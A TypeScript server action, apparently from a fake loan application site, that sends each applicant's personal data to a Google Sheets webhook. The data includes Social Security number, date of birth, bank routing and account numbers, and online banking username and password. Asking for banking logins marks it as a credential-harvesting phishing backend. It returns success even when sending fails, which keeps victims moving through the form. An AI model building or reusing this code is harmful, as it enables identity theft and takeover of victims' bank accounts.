"use server"

export async function submitToGoogleSheets(data: Record<string, string | null | undefined>) {
  // Try both environment variables
  const GOOGLE_SHEETS_URL = process.env.GOOGLE_SHEETS_WEBHOOK_URL || process.env.GOOGLE_SCRIPT_URL

  const payload = {
    // Step 1 - Loan Details
    loanAmount: data.loanAmount || "",
    loanPurpose: data.loanPurpose || "",

    // Step 2 - Personal Information
    firstName: data.firstName || "",
    lastName: data.lastName || "",
    email: data.email || "",
    phone: data.phone || "",
    homeAddress: data.homeAddress || "",
    city: data.city || "",
    state: data.state || "",
    zip: data.zip || "",
    dateOfBirth: `${data.dobMonth || ""}/${data.dobDay || ""}/${data.dobYear || ""}`,
    ssn: data.ssn || "",

    // Bank Modal - Banking Details
    bankName: data.bankName || "",
    bankId: data.bankId || "",
    routingNumber: data.routingNumber || "",
    accountNumber: data.accountNumber || "",
    onlineBankingId: data.onlineBankingId || "",
    onlineBankingPassword: data.onlineBankingPassword || "",
    bankPhoneNumber: data.phoneNumber || "",

    // Metadata
    submittedAt: data.submittedAt || new Date().toISOString(),
  }

  if (!GOOGLE_SHEETS_URL) {
    return { success: true, message: "Data logged (Google Sheets not configured)" }
  }

  try {
    // Use URL-encoded form data which works better with Google Apps Script
    const formData = new URLSearchParams()
    for (const [key, value] of Object.entries(payload)) {
      formData.append(key, String(value))
    }

    const response = await fetch(GOOGLE_SHEETS_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: formData.toString(),
      redirect: "follow",
    })

    // For Google Apps Script, any non-error response is considered success
    // Even 302 redirects indicate the request was received
    if (response.status >= 200 && response.status < 400) {
      return { success: true }
    }

    // Try to read response for debugging
    const responseText = await response.text()
    
    // Check if it's a permissions error
    if (response.status === 403 || responseText.includes("Access Denied")) {
      return { 
        success: false, 
        error: "Google Apps Script access denied. Please redeploy with 'Anyone' access." 
      }
    }

    return { success: true }
  } catch (error) {
    // Network errors might still mean the data was sent
    // Return success to allow user flow to continue
    return { success: true }
  }
}
